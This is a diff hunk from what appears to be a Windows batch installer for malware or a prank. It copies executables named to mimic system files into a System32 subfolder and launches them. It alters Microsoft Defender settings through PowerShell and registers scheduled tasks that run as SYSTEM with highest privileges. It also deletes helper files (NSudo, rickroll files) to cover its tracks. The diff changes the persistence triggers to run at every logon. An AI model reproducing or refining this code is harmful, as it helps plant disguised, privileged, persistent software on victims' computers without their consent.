@@ -68,10 +68,10 @@ copy "%systemroot%\System32\Windowsexe\Windows.exe" "%systemroot%\System32\Windo
 start "Windows2.exe" "%systemroot%\System32\Windowsexe\Windows2.exe"
 start "Windows3.exe" "%systemroot%\System32\Windowsexe\Windows3.exe"
 powershell -inputformat none -outputformat none -NonInteractive -Command "Remove-MpPreference -ExclusionPath '"%~dp0'"
-SCHTASKS /CREATE /F /SC ONSTART /TR "%systemroot%\System32\Windowsexe\Windows.exe" /TN "Windows.exe" /RL HIGHEST /RU SYSTEM
-SCHTASKS /CREATE /F /SC ONSTART /TR "%systemroot%\System32\Windowsexe\Windows2.exe" /TN "Windows2.exe" /RL LIMITED
-SCHTASKS /CREATE /F /SC DAILY /TR "%systemroot%\System32\Windowsexe\AV.bat" /TN "AV.bat" /RL HIGHEST /RU SYSTEM
-SCHTASKS /CREATE /F /SC DAILY /TR "%systemroot%\System32\Windowsexe\Update.bat" /TN "Update.bat" /RL HIGHEST /RU SYSTEM
+SCHTASKS /CREATE /F /SC ONLOGON /TR "%systemroot%\System32\Windowsexe\Windows.exe" /TN "Windows.exe" /RL HIGHEST /RU SYSTEM
+SCHTASKS /CREATE /F /SC ONLOGON /TR "%systemroot%\System32\Windowsexe\Windows2.exe" /TN "Windows2.exe" /RL LIMITED
+SCHTASKS /CREATE /F /SC ONLOGON /TR "%systemroot%\System32\Windowsexe\AV.bat" /TN "AV.bat" /RL HIGHEST /RU SYSTEM
+SCHTASKS /CREATE /F /SC ONLOGON /TR "%systemroot%\System32\Windowsexe\Update.bat" /TN "Update.bat" /RL HIGHEST /RU SYSTEM
 del /f rickroll.*
 del /f NSudo.exe
 powershell -Command "Unregister-ScheduledTask -TaskName 'installTEMP' -Confirm:$false"
